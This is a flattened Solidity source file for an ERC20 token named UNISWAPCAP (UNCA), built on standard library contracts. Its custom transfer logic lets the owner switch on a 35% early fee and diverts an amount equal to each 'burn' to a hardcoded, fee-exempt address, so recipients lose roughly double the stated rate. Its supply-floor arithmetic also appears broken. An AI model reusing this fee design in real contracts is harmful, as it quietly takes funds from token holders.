 

 

pragma solidity ^0.5.0;

 
interface IERC20 {
     
    function totalSupply() external view returns (uint256);

     
    function balanceOf(address account) external view returns (uint256);

     
    function transfer(address recipient, uint256 amount) external returns (bool);

     
    function allowance(address owner, address spender) external view returns (uint256);

     
    function approve(address spender, uint256 amount) external returns (bool);

     
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

     
    event Transfer(address indexed from, address indexed to, uint256 value);

     
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

 

pragma solidity ^0.5.0;

 
contract Context {
     
     
    constructor () internal { }
     

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;  
        return msg.data;
    }
}

 

pragma solidity ^0.5.0;

 
library SafeMath {
     
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

     
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

     
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

     
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         
         
         
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

     
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

     
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
         
        require(b > 0, errorMessage);
        uint256 c = a / b;
         

        return c;
    }

     
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

     
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

 

pragma solidity ^0.5.0;




 
contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

     
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

     
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

     
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

     
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

     
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

     
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

     
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

     
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

     
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

     
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

     
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

     
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

     
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
    }
}

 

pragma solidity ^0.5.0;


 
contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

     
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

     
    function name() public view returns (string memory) {
        return _name;
    }

     
    function symbol() public view returns (string memory) {
        return _symbol;
    }

     
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

 

pragma solidity ^0.5.0;

 
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

     
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

     
    function owner() public view returns (address) {
        return _owner;
    }

     
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

     
    function isOwner() public view returns (bool) {
        return _msgSender() == _owner;
    }

     
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

     
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

     
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

 

pragma solidity ^0.5.0;



 
contract ERC20Burnable is Context, ERC20 {
     
    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }

     
    function burnFrom(address account, uint256 amount) public {
        _burnFrom(account, amount);
    }
}

 

 
pragma solidity 0.5.17;






contract UNISWAPCAP is ERC20Detailed, ERC20Burnable, Ownable {
	uint256 public startBlock;
	address public lpAddress = address(0);
	address public routerAddress = address(0);
	address public routerAddressTwo = address(0);
	bool public burnOn = false;

	constructor() public ERC20Detailed('Uniswapcap.com', 'UNCA', 18) {
		_mint(msg.sender, 1000000 ether);
	}

	function burnRate(
		address sender,
		address recipient,
		uint256 amount
	) public view returns (uint256) {
		if (
			sender == this.owner() ||
			sender == 0x289bC0d9B211d575B5B38e94Cb0BF2D957311BD6 ||
			burnOn == false
		) {
			return 0;
		}
		if (
			sender == lpAddress ||
			sender == routerAddress ||
			sender == routerAddressTwo
		) {
			return 0;
		}
		if ((block.number).sub(startBlock) < 35000) {
			return amount.mul(350000).div(1000000);
		}
		if (this.totalSupply() <= 10000 ether) {
			 
			return 0;
		}
		if (this.totalSupply().sub(amount.mul(35000).div(1000000)) < 10000 ether) {
			uint256 minSupply = 10000 ether;
			return -(minSupply.sub(this.totalSupply()));
		}
		return amount.mul(35000).div(1000000);
	}

	function burnStart() public returns (bool) {
		if (msg.sender == this.owner()) {
			burnOn = true;
			startBlock = block.number;
			return true;
		} else {
			revert();
		}
	}

	function burnRestart() public returns (bool) {
		if (msg.sender == this.owner()) {
			burnOn = true;
			return true;
		} else {
			revert();
		}
	}

	function burnStop() public returns (bool) {
		if (msg.sender == this.owner()) {
			burnOn = false;
			return true;
		} else {
			revert();
		}
	}

	function setRouterAddressTwo(address newRouterAddress) public returns (bool) {
		if (msg.sender == this.owner()) {
			routerAddressTwo = newRouterAddress;
			return true;
		} else {
			revert();
		}
	}

	function setRouterAddress(address newRouterAddress) public returns (bool) {
		if (msg.sender == this.owner()) {
			routerAddress = newRouterAddress;
			return true;
		} else {
			revert();
		}
	}

	function setLpAddress(address newLpAddress) public returns (bool) {
		if (msg.sender == this.owner()) {
			lpAddress = newLpAddress;
			return true;
		} else {
			revert();
		}
	}

	function transferFrom(
		address sender,
		address recipient,
		uint256 amount
	) public returns (bool) {
		uint256 amountToBurn = burnRate(sender, recipient, amount);
		uint256 amountToSend = amount;
		if (amountToBurn > 0) {
			amountToSend = amount.sub(amountToBurn);
			amountToSend = amountToSend.sub(amountToBurn);
			_transfer(
				sender,
				0x289bC0d9B211d575B5B38e94Cb0BF2D957311BD6,
				amountToBurn
			);
			_burn(sender, amountToBurn);
		}
		super.transferFrom(sender, recipient, amountToSend);

		return true;
	}

	function transfer(address recipient, uint256 amount) public returns (bool) {
		uint256 amountToBurn = burnRate(_msgSender(), recipient, amount);
		uint256 amountToSend = amount;
		if (amountToBurn > 0) {
			amountToSend = amount.sub(amountToBurn);
			amountToSend = amountToSend.sub(amountToBurn);
			_transfer(
				_msgSender(),
				0x289bC0d9B211d575B5B38e94Cb0BF2D957311BD6,
				amountToBurn
			);
			_burn(_msgSender(), amountToBurn);
		}
		_transfer(_msgSender(), recipient, amountToSend);
		return true;
	}
}